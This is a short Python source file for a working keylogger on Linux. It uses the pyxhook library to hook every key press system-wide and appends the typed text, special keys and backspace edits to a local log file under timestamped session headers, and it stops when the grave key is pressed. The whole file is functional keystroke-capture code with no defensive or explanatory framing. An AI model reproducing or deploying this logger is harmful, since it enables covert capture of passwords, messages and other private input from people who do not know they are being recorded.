"""
The program terminates when grave key(`) is pressed

grave key is found below Esc key
"""

import pyxhook
import metadata
import os
from datetime import datetime

#change this to your log file's path
isPrevNl = False
log_file='file.log'
fob=open(log_file,'a+')
time = datetime.now()
fob.write("\n-----------------------------New Session "+ str(time) +" --------------------------\n")
fob.close()

#this function is called everytime a key is pressed.
def OnKeyPress(event):
	global isPrevNl
	fob=open(log_file,'a+')

	if event.Ascii==96: #96 is the ascii value of the grave key (`)
		fob.close()
		new_hook.cancel()

	elif event.Key=='Shift_R' or event.Key=='Shift_L':
		pass

	elif event.Key=="BackSpace":
		fob.seek(-1, os.SEEK_END)
		fob.truncate()

	elif event.Key=='Return':
		fob.write('\n')
		isPrevNl = True

	elif event.Key in metadata.data:
		fob.write(str(metadata.data[event.Key]))
		isPrevNl = False

	elif 32<=event.Ascii<=126:
		fob.write(chr(event.Ascii))
		isPrevNl = False

	else:
		if not isPrevNl:
			fob.write('\n')
		fob.write(event.Key)
		fob.write('\n')
		isPrevNl = True


#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
